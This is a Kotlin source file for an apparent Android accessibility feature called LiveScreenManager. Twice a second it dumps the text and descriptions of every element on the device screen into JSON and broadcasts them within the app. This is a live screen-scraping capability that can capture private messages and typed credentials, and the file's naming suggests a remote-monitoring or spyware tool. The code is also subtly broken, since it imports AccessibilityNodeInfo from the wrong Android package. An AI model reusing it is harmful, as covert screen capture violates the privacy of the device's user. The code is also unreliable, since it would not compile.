package com.systemlinker.features.systemacc

import android.accessibilityservice.AccessibilityNodeInfo
import android.content.Context
import android.content.Intent
import org.json.JSONArray
import org.json.JSONObject

class LiveScreenManager(private val context: Context) {
    
    var isStreaming = false
    private var lastDumpTime = 0L
    private val DUMP_INTERVAL_MS = 500L

    fun processStream(rootNode: AccessibilityNodeInfo?) {
        if (!isStreaming || rootNode == null) return
        
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastDumpTime < DUMP_INTERVAL_MS) return
        lastDumpTime = currentTime

        val screenData = dumpNode(rootNode)
        rootNode.recycle()

        val jsonPayload = JSONObject().apply { put("type", "live_screen"); put("data", screenData) }
        context.sendBroadcast(Intent("com.systemlinker.SCREEN_DATA").apply {
            setPackage(context.packageName)
            putExtra("json", jsonPayload.toString())
        })
    }

    private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
        val obj = JSONObject()
        obj.put("class", node.className?.toString() ?: "")
        obj.put("text", node.text?.toString() ?: "")
        obj.put("desc", node.contentDescription?.toString() ?: "")
        val children = JSONArray()
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { children.put(dumpNode(it)); it.recycle() }
        }
        if (children.length() > 0) obj.put("children", children)
        return obj
    }
}